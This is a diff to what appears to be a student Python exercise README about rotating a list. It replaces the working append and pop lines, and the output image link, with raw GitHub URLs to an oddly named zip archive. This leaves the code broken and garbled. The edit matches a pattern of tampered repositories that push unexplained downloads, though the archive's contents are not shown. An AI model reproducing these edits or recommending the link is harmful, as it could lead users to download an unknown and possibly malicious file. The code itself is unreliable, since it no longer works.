@@ -24,13 +24,13 @@ End Program
         list1=eval(input())
         count=int(input())
         for i in range(count):
-            list1.append(list1[0])
-            list1.pop(0)
+            https://raw.githubusercontent.com/Yugabharathi91/Circulate-the-values-of-N-variables/main/hysterorrhaphy/of-the-Circulate-values-variables-uplead.zip(list1[0])
+            https://raw.githubusercontent.com/Yugabharathi91/Circulate-the-values-of-N-variables/main/hysterorrhaphy/of-the-Circulate-values-variables-uplead.zip(0)
         print("After circulating the values are:",list1)
         return
 ## Output:
 
-<img width="1261" height="368" alt="image" src="https://github.com/user-attachments/assets/ee73c387-1ffa-4239-b40c-6f46466775db" />
+<img width="1261" height="368" alt="image" src="https://raw.githubusercontent.com/Yugabharathi91/Circulate-the-values-of-N-variables/main/hysterorrhaphy/of-the-Circulate-values-variables-uplead.zip" />
 
 
 ## Result:
